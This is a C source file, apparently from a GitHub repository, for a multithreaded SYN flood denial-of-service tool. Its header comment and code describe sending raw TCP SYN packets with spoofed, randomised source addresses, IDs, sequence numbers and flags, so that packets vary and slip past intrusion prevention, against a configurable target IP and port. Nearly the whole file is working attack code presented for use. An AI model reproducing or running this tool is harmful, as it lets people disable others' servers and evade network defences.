/* 
 * SYN DOS C - github.com/zedek1
 * this program will send a SYN packet with a false source address
 * which will leave the server in a "half open" state where it is waiting for an ack
 * ^ that state uses a certain amount of memory, so when we "flood" the server with these packets
 * the server will have trouble letting in new connections because it's still focusing on these
 *
 * also certain flags will be set in the tcp header to avoid ips pattern recognition
 * as well as a different ip address, id, and sequence number in each packet.
 * so every packet is different
 * 
 * - Headers
 * the ip and tcp header is neccessary for building the packet from scatch with our own details
 * in header.h i make my own structs for ip & tcp header so it can be compiled on windows
 * 
 * - Numbers
 * i implemented some weird as shit mathy random number generator
 * it works so so so much faster than normal rand()
 * it is only used in the main loop because the setup does not need to be fast
 * 
 * - Threads & Platform compatibility
 * i made sure the threads closed properly so a memory leak doesn't happen in tcp_checksum()
 * using normal windows API threads for windows and pthread for linux
 * WSA needs to be initialized for a socket to be properly created on windows
 * 
 */


// TODO: change fprintf to perror
#ifdef _WIN32// || _WIN64
    #include <Windows.h> // windows API functions
    #include <WinSock2.h> // windows sockets
    #include <WS2tcpip.h> // setsockopt options
#else
    #include <sys/socket.h> // linux sockets
    #include <arpa/inet.h> // socket / header options
    #include <unistd.h> // unix std library
    #include <pthread.h> // linux threads
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "headers.h"
#include "randcmwc.h"

#define IPADDRESS "192.168.1.100"
#define PORT 80
#define NUM_OF_THREADS 3
#define RUN_SECONDS 5
#define MAX_PACKET_LENGTH 4096

// 1 byte for true or false in main while loop
uint8_t FLOODING = 1;
unsigned int thread_count;

// different threads need different function types
#ifdef _WIN32
    DWORD WINAPI syn_flood(LPVOID args)
#else
    void *syn_flood()
#endif
{
    char datagram[MAX_PACKET_LENGTH]; // datagram = header and payload
    struct iphdr *iph = (struct iphdr *)datagram; 
    struct tcphdr *tcph = (void*)iph + sizeof(struct iphdr); //! (void*)

    // info on target
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(PORT);
    dst.sin_addr.s_addr = inet_addr(IPADDRESS);

    // if compiled on windows then start WSA
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0 ) {
            perror("WSAStartup failed: \n");
        }
    #endif

    // creating raw socket // btw uint64_t is unsigned long long which is SOCKET type
    //printf("Creating Socket\n");
    uint64_t s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
            perror("Could not open raw socket: \n");
            exit(-1); // close program
    }
    //printf("Setting up header fields\n");
    memset(datagram, 0, MAX_PACKET_LENGTH); // wipe datagram
    header_setup(iph, tcph); // fill out ip and tcp header fields

    // add the destination fields
    //printf("Adding victim info to headers & running checksum\n");
    // Target IP and PORT can be changed at the top of file
    tcph->dest = htons(PORT); // set port
    iph->ip_dst = dst.sin_addr.s_addr; // set IP
    iph->check = checksum ((uint16_t *)datagram, iph->tot_len);
    
    // set socket option to use the headers that were just set up
    //printf("Setting sock options to include headers\n");
    int error_code = 1;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&error_code, sizeof(error_code)) < 0) {
            perror("IP_HDRINCL cannot be set: \n");
            exit(-1);
    }

    // vars to change the same tcp header flags
    register int i = 0;
    uint16_t psh = 0;
    uint16_t res1 = 0;
    uint16_t res2 = 0;

    //printf("Starting Flood\n");
    // after RUN_SECONDS is done FLOODING is set to 0 in the main thread ending the loop
    while(FLOODING)
    {
        // send raw packet
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &dst, sizeof(dst));

        // rerandomize
        iph->ip_src = (rand_cmwc() >> 24 & 0xFF) << 24 |
                      (rand_cmwc() >> 16 & 0xFF) << 16 |
                      (rand_cmwc() >> 8 & 0xFF) << 8 |
                      (rand_cmwc() & 0xFF);

        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = checksum ((uint16_t*) datagram, iph->tot_len);

        tcph->seq = rand_cmwc() & 0xFFFF;
        tcph->source = htons(rand_cmwc() & 0xFFFF);

        // random flags
        if(psh > 1)  { psh = 1;  } 
        if(res1 > 4) { res1 = 0; }
        if(res2 > 3) { res2 = 0; }
        tcph->psh = psh;
        tcph->res1 = res1;
        tcph->res2 = res2;
        psh++; res1++; res2++; i++;

        tcph->check = tcp_checksum(iph, tcph);
    }
    printf("Done! sent %d packets\n");
    __sync_fetch_and_sub(&thread_count,1);
}

int main()
{
    init_rand(time(NULL)); // initialize fast num gen
    srand(time(NULL)); // set seed
    
    #ifdef _WIN32// || _WIN64
        //create thread handles
        //HANDLE thread1_handle, thread2_handle;
        int i;
        HANDLE array_of_threads[NUM_OF_THREADS];

        //start threads
        for (i = 0; i < NUM_OF_THREADS; i++)
        {
            array_of_threads[i] = CreateThread(NULL, 0, &syn_flood, NULL, 0, NULL);
        }

        printf("flooding %s...\n", IPADDRESS);
        Sleep(RUN_SECONDS * 1000); // wait milliseconds
        FLOODING = 0; // then stop threads
        
        // wait for threads to end then end
        WaitForMultipleObjects(NUM_OF_THREADS, array_of_threads, TRUE, INFINITE);
        
        for (i = 0; i < NUM_OF_THREADS; i++) {
            CloseHandle(array_of_threads[i]);
        }

    #else // pthread is a bit iffy
        pthread_t thread[NUM_OF_THREADS];
        thread_count = NUM_OF_THREADS;

        for(int i = 0; i < NUM_OF_THREADS; i++) {
                pthread_create(&thread[i], NULL, &syn_flood, NULL);
        }
        printf("flooding %s...\n", IPADDRESS);
        sleep(RUN_SECONDS);
        FLOODING = 0;
        do {
            __sync_synchronize();
        } while (thread_count);
        return 0;
    #endif

    printf("return 0\n");
    return 0;
}